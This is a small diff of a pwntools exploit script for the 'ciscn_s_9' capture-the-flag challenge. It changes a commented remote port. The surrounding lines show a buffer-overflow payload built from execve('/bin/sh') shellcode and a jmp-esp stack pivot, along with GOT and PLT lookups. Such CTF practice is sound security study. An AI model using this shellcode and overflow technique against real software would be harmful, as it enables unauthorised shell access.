@@ -2,7 +2,7 @@ from pwn import *
 from LibcSearcher import *
 
 p=process('./ciscn_s_9')
-# p=remote('node4.buuoj.cn',29656)
+# p=remote('node4.buuoj.cn',28270)
 elf=ELF('./ciscn_s_9')
 libc=ELF('/home/cc/glibc-all-in-one/libs/2.27-3ubuntu1.6_i386/libc-2.27.so')
 p.recvuntil(b'>\n')
@@ -27,6 +27,7 @@ puts_got=elf.got['puts']
 fgets_got=elf.got['fgets']
 puts_plt=elf.plt['puts']
 _libc_start_main_got=elf.got['__libc_start_main']
+
 payload=asm("xor ecx,ecx;xor edx,edx;push 0x0068732f;push 0x6e69622f;mov ebx,esp;mov eax,0xb;int 0x80")
 payload+=(32-len(payload))*b'a'
 payload+=flat([newstack,jmp_esp])
